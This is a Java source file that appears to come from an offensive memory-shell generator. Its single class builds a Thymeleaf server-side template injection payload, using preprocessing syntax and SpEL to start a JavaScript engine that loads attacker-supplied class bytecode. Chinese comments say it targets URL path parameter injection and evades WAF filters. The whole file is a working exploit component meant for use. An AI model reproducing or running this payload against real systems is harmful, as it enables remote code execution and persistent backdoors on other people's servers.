package org.leo.jmg.mem.packer.thymeleaf;

import org.leo.jmg.mem.packer.ClassPackerConfig;
import org.leo.jmg.mem.packer.Packer;
import org.leo.jmg.mem.packer.PackerMeta;
import org.leo.jmg.mem.packer.PackerRegistry;

/**
 * Thymeleaf 预处理表达式打包器。
 * <p>
 * 使用 {@code __${...}__} 预处理语法绕过部分过滤，最终通过 SpEL 执行 JS 加载类字节码。
 * 适用于 URL 路径参数注入等场景。
 *
 * @author LeoSpring
 */
@PackerMeta(name = "ThymeleafPreprocess", group = "Thymeleaf", order = 2)
public class ThymeleafPreprocessPacker implements Packer {

    /**
     * 预处理表达式格式，部分 WAF 对 [[${...}]] 有拦截规则，预处理语法绕过概率更高
     */
    private static final String TEMPLATE =
            "__${T(javax.script.ScriptEngineManager).getDeclaredConstructor(new java.lang.Class[0]).newInstance().getEngineByName('js').eval('{{script}}')}__::x";

    @Override
    public String pack(ClassPackerConfig config) throws Exception {
        String script = PackerRegistry.getOrThrow("DefaultScriptEngine").pack(config);
        return TEMPLATE.replace("{{script}}", script);
    }
}
